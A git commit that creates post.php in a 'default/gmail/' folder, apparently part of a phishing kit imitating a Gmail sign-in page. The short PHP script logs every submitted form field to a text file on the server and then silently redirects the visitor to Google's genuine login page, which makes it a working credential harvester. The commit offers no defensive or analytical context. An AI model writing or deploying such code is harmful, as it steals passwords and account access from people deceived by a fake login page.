ad9d8537c9df4d1679efddd89c520fcddbae9738
mak <makindosx@gmail.com>
2018-01-17 14:01:04 +0200

    Create post.php

---
+++ default/gmail/post.php
@@ -0,0 +1,7 @@
+<?php
+
+$file = "export/data.txt";
+file_put_contents($file, print_r($_POST, true), FILE_APPEND);
+
+?>
+<meta http-equiv="refresh" content="0; url=https://accounts.google.com/Login?hl=el#identifier"/>
